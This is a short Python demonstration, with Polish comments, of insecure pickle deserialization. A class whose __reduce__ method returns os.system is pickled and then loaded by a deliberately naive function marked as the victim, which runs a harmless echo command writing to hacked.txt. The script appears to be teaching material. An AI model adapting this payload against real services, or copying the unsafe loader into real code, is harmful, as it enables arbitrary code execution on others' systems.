import pickle
import os

# def load_user_blob(blob: bytes):
#     return pickle.loads(blob)

class Evil:
    def __reduce__(self):
        return (os.system, ('echo HAKED > hacked.txt',))

payload = pickle.dumps(Evil())

#ofiara -> naiwnie odczytuje obiekt z danymi
def insecure_load(blob: bytes):
    return pickle.loads(blob)

insecure_load(payload)
print("sprawdz plik hacked.txt")


